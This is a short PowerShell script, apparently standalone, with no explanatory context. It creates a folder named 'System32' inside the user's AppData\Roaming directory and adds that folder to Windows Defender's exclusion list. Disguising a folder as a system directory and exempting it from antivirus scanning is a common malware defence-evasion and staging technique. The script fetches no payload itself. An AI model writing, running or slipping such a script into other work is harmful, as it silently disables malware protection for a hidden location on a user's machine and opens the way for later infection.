# Get the current user's profile path
$userProfile = [System.Environment]::GetFolderPath('UserProfile')
$folderPath = Join-Path -Path $userProfile -ChildPath "AppData\Roaming\System32"

# Check if the folder exists; if not, create it
if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory -Force
    Write-Host "The folder '$folderPath' has been created."
} else {
    Write-Host "The folder '$folderPath' already exists."
}

# Add the folder to Windows Defender exclusions
try {
    Add-MpPreference -ExclusionPath $folderPath
    Write-Host "The folder '$folderPath' has been added to Windows Security exclusions."
} catch {
    Write-Host "An error occurred: $_"
}
